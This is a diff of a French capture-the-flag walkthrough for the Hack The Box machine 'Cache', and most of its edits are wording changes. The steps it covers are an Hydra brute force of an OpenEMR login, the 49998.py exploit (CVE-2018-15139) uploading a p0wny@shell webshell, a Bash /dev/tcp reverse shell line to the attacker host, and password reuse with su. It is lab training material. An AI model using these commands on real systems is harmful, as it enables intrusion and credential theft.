@@ -1126,13 +1126,13 @@ Marqueur d’échec   : error=1
 
 #### Attaque par dictionnaire avec Hydra
 
-Avant de préparer l’attaque par dictionnaire, tu reviens donc dans le répertoire de travail `hms` :
+Avant de lancer l’attaque par dictionnaire, tu reviens dans le répertoire de travail `hms` :
 
 ```
 cd ..
 ```
 
-Tu crées ensuite un sous-répertoire dédié à Hydra, puis un fichier contenant quelques mots de passe de test :
+Tu crées ensuite un sous-répertoire dédié à Hydra ainsi qu’un fichier contenant quelques mots de passe de test :
 
 ```bash
 mkdir -p hydra
@@ -1145,7 +1145,7 @@ H@v3_fun
 EOF
 ```
 
-L’arborescence de travail contient désormais deux répertoires distincts :
+L’arborescence de travail contient désormais un répertoire dédié à l’exploit `50017.py` et un autre à Hydra :
 
 ```text
 hms/
@@ -1153,9 +1153,9 @@ hms/
 └── hydra/
 ```
 
-Cette première liste ne vise pas encore à trouver le mot de passe. Elle permet surtout de confirmer que Hydra reproduit correctement la requête observée dans Burp Suite et interprète correctement le marqueur d’échec.
+Cette première liste ne vise pas encore à trouver le mot de passe. Elle sert surtout à vérifier que Hydra reproduit correctement la requête observée dans Burp Suite et reconnaît bien le marqueur d’échec.
 
-Tu lances le test avec :
+Tu lances alors Hydra avec cette liste de test :
 
 ```bash
 hydra -l openemr_admin \
@@ -1167,35 +1167,35 @@ http-post-form \
 -V
 ```
 
-L’option `-l` précise le nom d’utilisateur déjà connu, tandis que `-P` indique le fichier contenant les mots de passe à tester.
+L’option `-l` indique le nom d’utilisateur déjà connu, tandis que `-P` désigne le fichier contenant les mots de passe à tester.
 
-Le module `http-post-form` demande ensuite trois éléments séparés par des deux-points :
+Le module `http-post-form` attend ensuite trois éléments séparés par des deux-points :
 
 ```text
 <URL>:<données envoyées>:<condition d’échec>
 ```
 
-Dans cette commande :
+Dans cette commande, les trois éléments correspondent à :
 
 ```url
 /interface/main/main_screen.php?auth=login&site=default
 ```
 
-correspond à l’URL appelée par le formulaire ;
+correspond à l’URL de destination de la requête ;
 
 ```bash
 new_login_session_management=1&authProvider=Default&languageChoice=1&authUser=openemr_admin&clearPass=^PASS^
 ```
 
-reproduit le corps de la requête `POST`, Hydra remplaçant `^PASS^` par chaque mot de passe de la liste ;
+reproduit le corps de la requête `POST`. Hydra remplace `^PASS^` par chaque mot de passe de la liste ;
 
 ```bash
 F=error=1
 ```
 
-indique que la présence de `error=1` dans la réponse correspond à un échec d’authentification.
+indique que la présence de `error=1` dans la réponse signale un échec d’authentification.
 
-L’option `-t 1` limite Hydra à une seule tâche simultanée pendant cette phase de validation, tandis que `-V` affiche chaque tentative effectuée.
+L’option `-t 1` limite Hydra à une seule tâche simultanée pour cette phase de validation, tandis que `-V` affiche chaque tentative effectuée.
 
 Voici le résultat :
 
@@ -1214,18 +1214,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at [date]
 
 ```
 
-Les quatre mots de passe sont correctement traités comme des échecs. La syntaxe de la commande et le marqueur `F=error=1` sont donc validés.
+Les quatre mots de passe sont correctement reconnus comme des échecs. Cela confirme que Hydra reproduit correctement la requête et que le marqueur `F=error=1` permet d’identifier les authentifications refusées.
 
-Tu peux maintenant préparer une liste plus importante en extrayant les 10 000 premiers mots de passe de RockYou :
+Tu prépares maintenant une liste plus importante en extrayant les 10 000 premiers mots de passe de RockYou :
 
 ```bash
 head -n 10000 /usr/share/wordlists/rockyou.txt \
   > hydra/rockyou-10000.txt
 ```
 
-Cette limitation permet d’éviter de lancer immédiatement une attaque sur l’intégralité de la wordlist, alors que le mot de passe recherché peut se trouver parmi les entrées les plus courantes.
+Cette limitation évite de tester immédiatement l’intégralité de la wordlist et permet de commencer par les mots de passe les plus courants.
 
-Tu relances ensuite Hydra avec cette nouvelle liste :
+Tu relances ensuite Hydra avec cette liste de 10 000 mots de passe :
 
 ```bash
 hydra -l openemr_admin \
@@ -1237,9 +1237,7 @@ hydra -l openemr_admin \
   -V
 ```
 
-L’attaque peut prendre plusieurs minutes, notamment selon la vitesse de réponse du serveur et la position du mot de passe dans la liste. 
-
-Hydra teste successivement les mots de passe de la liste et finit par identifier une combinaison valide :
+Hydra teste successivement les mots de passe de la liste jusqu’à identifier une combinaison valide :
 
 ```text
 [80][http-post-form] host: hms.htb   login: openemr_admin   password: xxxxxx
@@ -1251,21 +1249,19 @@ Tu disposes désormais des identifiants suivants :
 openemr_admin:xxxxxx
 ```
 
-
-
-Avant d’utiliser ces identifiants avec les exploits OpenEMR authentifiés, tu vérifies s’ils peuvent également correspondre à un compte local accessible en SSH :
+Avant d’utiliser ces identifiants avec les exploits OpenEMR authentifiés, tu vérifies s’ils correspondent aussi à un compte local accessible en SSH :
 
 ```bash
 ssh openemr_admin@cache.htb
 ```
 
-Le mot de passe découvert avec Hydra n’est toutefois pas accepté. Le compte `openemr_admin` semble donc être limité à l’application OpenEMR.
+Le mot de passe découvert avec Hydra n’est toutefois pas accepté en SSH. Les identifiants `openemr_admin` semblent donc être propres à l’application OpenEMR.
 
-Tu disposes désormais des identifiants nécessaires pour tester les exploits OpenEMR authentifiés `49998.py` et `45161.py`.
+Tu disposes maintenant des identifiants nécessaires pour tester les exploits OpenEMR authentifiés `49998.py` et `45161.py`.
 
 ### Analyse de l’exploit `49998.py`
 
-Tu te trouves actuellement dans le répertoire de travail `hms`. Tu crées un sous-répertoire consacré à l’exploit `49998.py`, puis tu y copies le script avec `searchsploit` :
+Depuis le répertoire de travail `hms`, tu crées un sous-répertoire dédié à l’exploit `49998.py`, puis tu y copies le script avec `searchsploit` :
 
 ```bash
 mkdir -p 49998
@@ -1274,13 +1270,7 @@ cd 49998
 searchsploit -m php/webapps/49998.py
 ```
 
-Le fichier est maintenant disponible dans le répertoire courant :
-
-```text
-49998.py
-```
-
-Avant de l’exécuter, tu affiches son code source dans un éditeur de texte afin d’en examiner l’en-tête, les commentaires et les différentes étapes de l’exploitation :
+Avant de l’exécuter, tu ouvres `49998.py` dans un éditeur de texte afin d’examiner son en-tête, ses commentaires et les différentes étapes de l’exploitation :
 
 ```bash
 nano 49998.py
@@ -1292,27 +1282,29 @@ L’en-tête indique que le script exploite la vulnérabilité suivante :
 CVE-2018-15139
 ```
 
-Le script commence par s’authentifier auprès d’OpenEMR avec un compte valide. Il tente ensuite d’accéder à la page suivante :
+Le script commence par s’authentifier auprès d’OpenEMR avec un compte valide, puis tente d’accéder à la page suivante :
 
 ```text
 /interface/super/manage_site_files.php
 ```
 
-Cette fonctionnalité permet normalement de gérer certains fichiers du site. L’exploit cherche à en abuser afin d’envoyer une webshell PHP nommée :
+Cette fonctionnalité permet normalement de gérer certains fichiers du site. L’exploit en abuse pour envoyer une webshell PHP nommée :
 
 ```text
 shell.php
 ```
 
-Le code du script contient directement une webshell complète de type `p0wny@shell`.
+Le script intègre directement une webshell complète basée sur `p0wny@shell`.
 
-Si l’envoi réussit, le fichier doit être déposé dans le répertoire des images du site OpenEMR par défaut et devenir accessible à l’adresse suivante :
+`p0wny@shell` est une webshell PHP légère qui fournit, depuis un navigateur, une interface permettant d’exécuter des commandes sur le serveur avec les privilèges du compte utilisé par le serveur web.
 
-```text
+Si l’envoi réussit, la webshell doit être déposée dans le répertoire des images du site OpenEMR par défaut et devenir accessible à l’adresse suivante :
+
+```url
 http://hms.htb/sites/default/images/shell.php
 ```
 
-Avant de lancer l’exploitation, tu affiches l’aide du script afin d’identifier les paramètres attendus :
+Avant de lancer l’exploitation, tu affiches l’aide de `49998.py` afin d’identifier les paramètres attendus :
 
 ```bash
 python3 49998.py -h
@@ -1351,7 +1343,7 @@ options:
   -p, --PASSWORD PASSWORD
 ```
 
-L’avertissement `SyntaxWarning` concerne uniquement une séquence d’échappement présente dans la bannière ASCII du script. Il n’empêche pas l’affichage de l’aide.
+Le `SyntaxWarning` provient d’une séquence d’échappement utilisée dans la bannière ASCII du script et n’empêche pas son exécution.
 
 Les paramètres attendus sont les suivants :
 
@@ -1363,7 +1355,7 @@ Les paramètres attendus sont les suivants :
 -p  mot de passe OpenEMR
 ```
 
-Dans notre cas, OpenEMR est directement accessible à la racine de `hms.htb`. Le paramètre `-U` peut donc recevoir une valeur vide.
+OpenEMR est directement accessible à la racine de `hms.htb`. Le paramètre `-U` peut donc recevoir une valeur vide.
 
 La commande d’exploitation prend ainsi la forme suivante :
 
@@ -1375,10 +1367,6 @@ python3 49998.py \
   -u openemr_admin \
   -p 'xxxxxx'
 ```
-
-Le script s’authentifie avec le compte `openemr_admin`, puis exploite la fonctionnalité `manage_site_files.php` afin d’envoyer une webshell nommée `shell.php` dans le répertoire des images du site OpenEMR.
-
-Cette webshell utilise **p0wny@shell**, une interface PHP légère qui s’ouvre dans le navigateur et permet d’exécuter des commandes système sur le serveur distant. Elle fournit ainsi un accès en ligne de commande depuis une simple page web, avec les privilèges du compte utilisé par le serveur HTTP.
 
 Le script indique que la webshell doit être accessible à l’adresse suivante :
 
@@ -1408,7 +1396,7 @@ L’exploit `49998.py` permet donc d’obtenir directement une exécution de com
 
 ### Identification des utilisateurs locaux
 
-Depuis la webshell, tu examines le contenu du répertoire `/home` afin d’identifier les comptes locaux présents sur la machine :
+Depuis la webshell, tu examines le contenu du répertoire `/home` afin d’identifier les utilisateurs locaux présents sur la machine :
 
 ```bash
 ls -l /home
@@ -1416,7 +1404,7 @@ ls -l /home
 
 La commande retourne :
 
-```text
+```bash
 total 8
 drwxr-xr-x 11 ash   ash   4096 May  6  2020 ash
 drwxr-x---  5 luffy luffy 4096 May  6  2020 luffy
@@ -1462,15 +1450,9 @@ Le fichier `user.txt` est bien présent, mais ses permissions montrent qu’il n
 
 L’accès obtenu en tant que `www-data` ne suffit donc pas encore pour lire le flag utilisateur.
 
-Les identifiants suivants, découverts au début de l’énumération, n’ont jusqu’à présent permis ni une connexion SSH ni un accès à OpenEMR :
+Les identifiants `ash:H@v3_fun`, découverts au début de l’énumération, n’ont jusqu’à présent permis ni de se connecter en SSH ni d’accéder à OpenEMR. Comme `user.txt` appartient à `ash` et n’est pas lisible par `www-data`, tu peux maintenant tester ces identifiants directement depuis le shell en tentant de basculer vers l’utilisateur `ash` avec `su`.
 
-```text
-ash:H@v3_fun
-```
-
-La présence d’un compte local nommé `ash` donne toutefois une nouvelle raison de tester une éventuelle réutilisation de ce mot de passe directement depuis la machine compromise.
-
-Depuis la webshell, tu essaies donc de basculer vers cet utilisateur :
+Depuis la webshell, tu tentes donc de basculer vers l’utilisateur `ash` :
 
 ```bash
 su - ash
@@ -1482,13 +1464,13 @@ La tentative échoue avec le message suivant :
 su: must be run from a terminal
 ```
 
-Cette erreur ne signifie pas que le mot de passe est incorrect. Elle indique que `su` exige un véritable terminal interactif pour demander et lire le mot de passe.
+Cette erreur ne signifie pas que le mot de passe est incorrect. Elle indique simplement que `su` a besoin d’un terminal interactif pour demander le mot de passe.
 
-La webshell `p0wny@shell` permet d’exécuter des commandes, mais elle ne fournit pas ce type de terminal. Il faut donc obtenir un reverse shell avant de pouvoir réessayer correctement la commande `su`.
+La webshell `p0wny@shell` permet d’exécuter des commandes, mais ne fournit pas de terminal interactif. Il faut donc obtenir un reverse shell avant de pouvoir réessayer la commande `su`.
 
 ### Obtention d’un reverse shell en tant que `www-data`
 
-Pour obtenir un shell plus interactif que la webshell `p0wny@shell`, tu commences par lancer un listener sur Kali :
+Pour obtenir un terminal interactif permettant notamment d’utiliser `su`, tu commences par lancer un listener sur Kali :
 
 ```bash
 rlwrap -cAr nc -lvnp 4444
@@ -1497,13 +1479,13 @@ rlwrap -cAr nc -lvnp 4444
 Depuis `p0wny@shell`, tu exécutes ensuite un reverse shell Bash vers l’adresse IP de l’interface `tun0` de Kali :
 
 ```bash
-bash -c 'bash -i >& /dev/tcp/10.10.15.96/4444 0>&1'
+bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'
 ```
 
-Le listener reçoit alors une connexion depuis la cible :
+Le listener reçoit alors la connexion depuis la cible :
 
 ```text
-connect to [10.10.15.96] from [10.129.x.x]
+connect to [10.10.x.x] from [10.129.x.x]
 ```
 
 Tu obtiens un shell en tant que `www-data` :
@@ -1512,11 +1494,11 @@ Tu obtiens un shell en tant que `www-data` :
 www-data@cache:/var/www/hms.htb/public_html/sites/default/images$
 ```
 
-Ce shell reste encore rudimentaire et doit être stabilisé pour obtenir un terminal suffisamment interactif en te basant sur la recette :
+Ce shell reste rudimentaire. Tu le stabilises en suivant la recette dédiée :
 
 {{< recette "stabiliser-reverse-shell" >}}
 
-Tu commences par créer un pseudo-terminal avec Python :
+Tu commences par créer un pseudo-terminal avec Python afin de rendre le shell plus interactif :
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -1547,7 +1529,7 @@ Lorsque `reset` demande le type de terminal, tu réponds :
 xterm
 ```
 
-Enfin, tu définis explicitement la variable d’environnement `TERM` :
+Enfin, tu définis la variable d’environnement `TERM` :
 
 ```bash
 export TERM=xterm
@@ -1555,7 +1537,7 @@ export TERM=xterm
 
 ### Passage à l’utilisateur `ash`
 
-Tu disposes maintenant d’un terminal suffisamment interactif pour réessayer le passage vers le compte `ash` :
+Tu disposes maintenant d’un terminal suffisamment interactif pour réessayer de basculer vers le compte `ash` :
 
 ```bash
 su - ash
@@ -1567,7 +1549,7 @@ Lorsque le mot de passe est demandé, tu saisis celui découvert au début de l�
 H@v3_fun
 ```
 
-Cette fois, l’authentification réussit et tu obtiens un shell sous le compte `ash` :
+Cette fois, l’authentification réussit et tu bascules vers le compte `ash` :
 
 ```text
 ash@cache:~$
@@ -1587,14 +1569,16 @@ uid=1000(ash) gid=1000(ash) groups=1000(ash)
 
 ### Lecture du flag `user.txt`
 
-Tu peux enfin lire le flag utilisateur :
+Tu lis enfin le flag utilisateur :
 
 ```bash
 cat /home/ash/user.txt
 8e33xxxxxxxxxxxxxxxxxxxxxxxxxx097b
 ```
 
-La partie **Prise pied** s’achève ici, avec l’obtention d’un shell sous le compte `ash` et la lecture de `user.txt`.
+La partie Prise pied s’achève ici, avec l’accès au compte `ash` et la lecture de `user.txt`.
+
+Tu peux maintenant poursuivre l’énumération locale afin de rechercher une possibilité d’escalade de privilèges.
 
 ## Escalade de privilèges
 
